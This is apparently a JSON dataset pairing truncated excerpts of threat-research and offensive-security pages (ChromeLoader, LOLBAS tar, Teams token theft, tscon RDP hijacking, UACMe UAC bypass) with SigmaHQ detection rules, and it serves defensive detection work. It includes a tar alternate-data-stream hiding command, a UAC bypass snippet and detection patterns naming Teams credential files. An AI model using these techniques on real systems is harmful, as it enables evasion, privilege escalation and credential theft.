    "markdown": "# ChromeLoader: New Stubborn Malware Campaign **Malware** ### Related Products - Advanced WildFire - Cortex XDR **Published:** July 12, 2022 **Categories:** Malware, Threat Research **Tags:** Adware, Browser hijacker, Choziosi Loader, ChromeBack, ChromeLoader, Infostealer, Malvertising --- ## Executive Summary In January 2022, a new browser hijacker/adware campaign named ChromeLoader (also known as Choziosi Loader and ChromeBack) was discovered. Despite using simple malicious advertisements, the malware became widespread, potentially leaking data from thousands of users and organizations. Instead of more traditional malware like a Windows executable (`.exe`) or Dynamic Link Library (`.dll`), the malware authors used a browser extension as their final",
    "sigma_rule": {
      "title": "Compressed File Creation Via Tar.EXE",
      "id": "418a3163-3247-4b7b-9933-dcfcb7c52ea9",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_create": {
          "CommandLine|contains": [
            "-c",
            "-r",
            "-u"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_compression.yml"
  },
  "599": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
    "markdown": "# /Tar.exe Used by Windows to extract and create archives. ### Paths: - `C:\\Windows\\System32\\tar.exe` - `C:\\Windows\\SysWOW64\\tar.exe` ### Resources: - https://twitter.com/Cyber_Sorcery/status/1619819249886969856 ### Detections: - Sigma: proc_creation_win_tar_compression.yml - Sigma: proc_creation_win_tar_extraction.yml - IOC: tar.exe extracting files from a remote host within the environment - IOC: Abnormal processes spawning tar.exe - IOC: tar.exe interacting with alternate data streams (ADS) ## Alternate data streams 1. **Compress one or more files to an alternate data stream (ADS).** ``` tar -cf compressedfilename:ads C:\\folder\\file ``` **Properties:** - **Use case:** Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism - **Privileges required:**",
    "sigma_rule": {
      "title": "Compressed File Creation Via Tar.EXE",
      "id": "418a3163-3247-4b7b-9933-dcfcb7c52ea9",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_create": {
          "CommandLine|contains": [
            "-c",
            "-r",
            "-u"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_compression.yml"
  },
  "600": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage",
    "markdown": "# Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign **Posted:** 17 Nov, 2020 **Category:** Threat Intelligence --- ## Evidence that advanced persistent threat group Cicada is behind attack campaign targeting companies in 17 regions and multiple sectors. A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sectors, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicate that",
    "sigma_rule": {
      "title": "Compressed File Creation Via Tar.EXE",
      "id": "418a3163-3247-4b7b-9933-dcfcb7c52ea9",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_create": {
          "CommandLine|contains": [
            "-c",
            "-r",
            "-u"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_compression.yml"
  },
  "601": {
    "url": "https://unit42.paloaltonetworks.com/chromeloader-malware/",
    "markdown": "# ChromeLoader: New Stubborn Malware Campaign **Malware** ### Related Products - Advanced WildFire - Cortex XDR **Published:** July 12, 2022 **Categories:** Malware, Threat Research **Tags:** Adware, Browser hijacker, Choziosi Loader, ChromeBack, ChromeLoader, Infostealer, Malvertising --- ## Executive Summary In January 2022, a new browser hijacker/adware campaign named ChromeLoader (also known as Choziosi Loader and ChromeBack) was discovered. Despite using simple malicious advertisements, the malware became widespread, potentially leaking data from thousands of users and organizations. Instead of more traditional malware like a Windows executable (`.exe`) or Dynamic Link Library (`.dll`), the malware authors used a browser extension as their final",
    "sigma_rule": {
      "title": "Compressed File Extraction Via Tar.EXE",
      "id": "bf361876-6620-407a-812f-bfe11e51e924",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_extract": {
          "CommandLine|contains": "-x"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_extraction.yml"
  },
  "602": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
    "markdown": "# /Tar.exe Used by Windows to extract and create archives. ### Paths: - `C:\\Windows\\System32\\tar.exe` - `C:\\Windows\\SysWOW64\\tar.exe` ### Resources: - https://twitter.com/Cyber_Sorcery/status/1619819249886969856 ### Detections: - Sigma: proc_creation_win_tar_compression.yml - Sigma: proc_creation_win_tar_extraction.yml - IOC: tar.exe extracting files from a remote host within the environment - IOC: Abnormal processes spawning tar.exe - IOC: tar.exe interacting with alternate data streams (ADS) ## Alternate data streams 1. **Compress one or more files to an alternate data stream (ADS).** ``` tar -cf compressedfilename:ads C:\\folder\\file ``` **Properties:** - **Use case:** Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism - **Privileges required:**",
    "sigma_rule": {
      "title": "Compressed File Extraction Via Tar.EXE",
      "id": "bf361876-6620-407a-812f-bfe11e51e924",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_extract": {
          "CommandLine|contains": "-x"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_extraction.yml"
  },
  "603": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage",
    "markdown": "# Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign **Posted:** 17 Nov, 2020 **Category:** Threat Intelligence --- ## Evidence that advanced persistent threat group Cicada is behind attack campaign targeting companies in 17 regions and multiple sectors. A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sectors, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicate that",
    "sigma_rule": {
      "title": "Compressed File Extraction Via Tar.EXE",
      "id": "bf361876-6620-407a-812f-bfe11e51e924",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_extract": {
          "CommandLine|contains": "-x"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_extraction.yml"
  },
  "604": {
    "url": "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
    "markdown": "# Microsoft Teams stores auth tokens as cleartext in Windows, Linux, Macs September 14, 2022 Security analysts have found a severe security vulnerability in the desktop app for Microsoft Teams that gives threat actors access to authentication tokens and accounts with multi-factor authentication (MFA) turned on. Microsoft Teams is a communication platform, included in the 365 product family, used by more than 270 million people for exchanging text messages, videoconferencing, and storing files. The newly discovered security issue impacts versions of the application for Windows, Linux, and Mac and refers to Microsoft Teams storing user authentication tokens in clear text",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Targeting Teams Sensitive Files",
      "id": "d2eb17db-1d39-41dc-b57f-301f6512fa75",
      "status": "test",
      "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "modified": "2023-12-18",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter_main_legit_locations": {
          "Image|endswith": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_teams_suspicious_command_line_cred_access.yml"
  },
  "605": {
    "url": "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens",
    "markdown": "# Undermining Microsoft Teams Security by Mining Tokens **September 13, 2022** ## Overview In August 2022, the Vectra Protect team identified a post-exploitation opportunity allowing malicious actors with sufficient local or remote file system access to steal valid user credentials from Microsoft Teams due to their plaintext storage on disk. This plaintext credential management was determined to impact all commercial and GCC Desktop Teams clients for Windows, Mac, and Linux. While credential harvesting from memory is a common post-exploitation step, we believe that lowering the bar necessary to harvest creds down to just simple read access to the file system",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Targeting Teams Sensitive Files",
      "id": "d2eb17db-1d39-41dc-b57f-301f6512fa75",
      "status": "test",
      "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "modified": "2023-12-18",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter_main_legit_locations": {
          "Image|endswith": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_teams_suspicious_command_line_cred_access.yml"
  },
  "606": {
    "url": "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
    "markdown": "# Passwordless RDP Session Hijacking Feature All Windows versions *This post is periodically updated, all updates are at the end of the post.* **Update:** Added Windows Server 2016 Datacenter Demo Hey there, **Blogpost in 20 seconds:** Fun with sethc backdoored host :) somewhere on the internet: [RDP Hijacking of sethc backdoored host](https://www.youtube.com/watch?v=OZqTK_yQbHk) Recently, I've played with sethc/utilman logon screen backdoors, and almost every time I used just the command line. Occasionally, I looked at the Users tab in Task Manager (taskmgr.exe), clicked the connect button, and surprisingly **I got connected to the selected user's session**. ```image Alt: Task Manager Screenshot",
    "sigma_rule": {
      "title": "Suspicious TSCON Start as SYSTEM",
      "id": "9847f263-4a81-424f-970c-875dab15b79b",
      "status": "test",
      "description": "Detects a tscon.exe start as LOCAL SYSTEM",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2022-05-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "User|contains": [
            "AUTHORI",
            "AUTORI"
          ],
          "Image|endswith": "\\tscon.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_localsystem.yml"
  },
  "607": {
    "url": "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
    "markdown": "# RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation **How you can very easily use Remote Desktop Services to gain lateral movement through a network, using no external software — and how to defend against it.** ```image Alt: Alexander Korznikov demonstrates using Sticky Keys and tscon to access an administrator RDP session — without even logging into the server. Description: The gif shows a Windows Server 2012 R2 desktop environment with a command prompt window open. The command prompt is in the foreground and indicates that it is running with administrative privileges,",
    "sigma_rule": {
      "title": "Suspicious TSCON Start as SYSTEM",
      "id": "9847f263-4a81-424f-970c-875dab15b79b",
      "status": "test",
      "description": "Detects a tscon.exe start as LOCAL SYSTEM",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2022-05-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "User|contains": [
            "AUTHORI",
            "AUTORI"
          ],
          "Image|endswith": "\\tscon.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_localsystem.yml"
  },
  "608": {
    "url": "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement",
    "markdown": "# RDP Hijacking for Lateral Movement with tscon This lab explores a technique that allows a SYSTEM account to move laterally through the network using RDP without the need for credentials. ## Execution It is possible by design to switch from one user's desktop session to another through the Task Manager (one of the ways). Below shows that there are two users on the system and currently the administrator session is in active: ```image Alt: RDP Admin Session Description: The image displays a Windows Task Manager interface showing two user sessions: \"administrator\" and \"spotless.\" The administrator session is active, while",
    "sigma_rule": {
      "title": "Suspicious TSCON Start as SYSTEM",
      "id": "9847f263-4a81-424f-970c-875dab15b79b",
      "status": "test",
      "description": "Detects a tscon.exe start as LOCAL SYSTEM",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2022-05-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "User|contains": [
            "AUTHORI",
            "AUTORI"
          ],
          "Image|endswith": "\\tscon.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_localsystem.yml"
  },
  "609": {
    "url": "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
    "markdown": "# Passwordless RDP Session Hijacking Feature All Windows versions *This post is periodically updated, all updates are at the end of the post.* **Update:** Added Windows Server 2016 Datacenter Demo Hey there, **Blogpost in 20 seconds:** Fun with sethc backdoored host :) somewhere on the internet: [RDP Hijacking of sethc backdoored host](https://www.youtube.com/watch?v=OZqTK_yQbHk) Recently, I've played with sethc/utilman logon screen backdoors, and almost every time I used just the command line. Occasionally, I looked at the Users tab in Task Manager (taskmgr.exe), clicked the connect button, and surprisingly **I got connected to the selected user's session**. ```image Alt: Task Manager Screenshot",
    "sigma_rule": {
      "title": "Suspicious RDP Redirect Using TSCON",
      "id": "f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb",
      "status": "test",
      "description": "Detects a suspicious RDP session redirect using tscon.exe",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2023-05-16",
      "tags": [
        "attack.lateral-movement",
        "attack.t1563.002",
        "attack.t1021.001",
        "car.2013-07-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": " /dest:rdp-tcp#"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_rdp_redirect.yml"
  },
  "610": {
    "url": "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
    "markdown": "# RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation **How you can very easily use Remote Desktop Services to gain lateral movement through a network, using no external software — and how to defend against it.** ```image Alt: Alexander Korznikov demonstrates using Sticky Keys and tscon to access an administrator RDP session — without even logging into the server. Description: The gif shows a Windows Server 2012 R2 desktop environment with a command prompt window open. The command prompt is in the foreground and indicates that it is running with administrative privileges,",
    "sigma_rule": {
      "title": "Suspicious RDP Redirect Using TSCON",
      "id": "f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb",
      "status": "test",
      "description": "Detects a suspicious RDP session redirect using tscon.exe",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2023-05-16",
      "tags": [
        "attack.lateral-movement",
        "attack.t1563.002",
        "attack.t1021.001",
        "car.2013-07-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": " /dest:rdp-tcp#"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_rdp_redirect.yml"
  },
  "611": {
    "url": "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/",
    "markdown": "# RDP Session Hijacking with tscon **Published on:** April 24, 2020 In this article, we will learn to hijack an RDP session using various methods. This is a part of Lateral movement which is a technique that the attacker uses to move through the target environment after gaining access. ### Table of Content: - Introduction to RDP - Features of RDP - Working of RDP - Introduction of tscon - Manual - Task manager - Mimikatz - Mitigation - Conditions for the practical - Conclusion --- ### Introduction to RDP RDP stands for Remote Desktop Protocol which works on port",
    "sigma_rule": {
      "title": "Suspicious RDP Redirect Using TSCON",
      "id": "f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb",
      "status": "test",
      "description": "Detects a suspicious RDP session redirect using tscon.exe",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2023-05-16",
      "tags": [
        "attack.lateral-movement",
        "attack.t1563.002",
        "attack.t1021.001",
        "car.2013-07-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": " /dest:rdp-tcp#"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_rdp_redirect.yml"
  },
  "612": {
    "url": "https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b",
    "markdown": "# Privilege escalation (UAC bypass) in ChangePK ```image Description: The image depicts a computer screen showing two main components: the Windows Registry Editor on the top and multiple command line interfaces (cmd) below. The Registry Editor displays a specific path related to user settings, highlighting a command that executes 'cmd.exe'. Below it, the command line windows show PowerShell commands being executed, particularly one that uses 'start-process' to run a Windows executable ('slui.exe') with elevated permissions. This setup illustrates a privilege escalation method through User Account Control (UAC) bypass. Transcription: | Computer\\HKEY_CURRENT_USER\\Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command Shell Command (Default) REG_SZ \"C:\\Windows\\System32\\cmd.exe\" DelegateExecute REG_SZ C:\\>powershell -ep",
    "sigma_rule": {
      "title": "UAC Bypass Using ChangePK and SLUI",
      "id": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
      "status": "test",
      "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
      "references": [
        "https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\changepk.exe",
          "ParentImage|endswith": "\\slui.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_changepk_slui.yml"
  },
  "613": {
    "url": "https://github.com/hfiref0x/UACME",
    "markdown": "# UACMe ## Folders and Files - Bin - Source - .gitattributes - LICENSE.md - README.md - appveyor.yml ## README Build status: build passing ## UACMe ### Defeating Windows User Account Control - Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor. ### System Requirements - x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too). - Admin account with UAC set on default settings required. ### Usage Run executable from command line: `akagi32 [Key] [Param]` or `akagi64 [Key] [Param]`. See \"Run examples\" below for more info. First parameter is number of method to use, second",
    "sigma_rule": {
      "title": "UAC Bypass Using ChangePK and SLUI",
      "id": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
      "status": "test",
      "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
      "references": [
        "https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\changepk.exe",
          "ParentImage|endswith": "\\slui.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_changepk_slui.yml"
  },
  "614": {
    "url": "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf",
    "markdown": "# FalconFriday — Detecting UAC Bypasses — 0xFF16 *Aug 20, 2021* --- *Attackers often require full administrative privileges on a machine to be able to use their full attack capabilities. Many attacks originate from a regular user account running with low or medium integrity. Therefore one of the first things an attacker needs to do is bypass User Account Control (UAC) to get access to a process running with high integrity. If the targeted user has administrative privileges this can be achieved by using social engineering techniques to have them approve a UAC prompt or by using a UAC bypass",
    "sigma_rule": {
      "title": "UAC Bypass Using ChangePK and SLUI",
      "id": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
      "status": "test",
      "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
      "references": [
        "https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b",
        "https://github.com/hfiref0x/UACME",
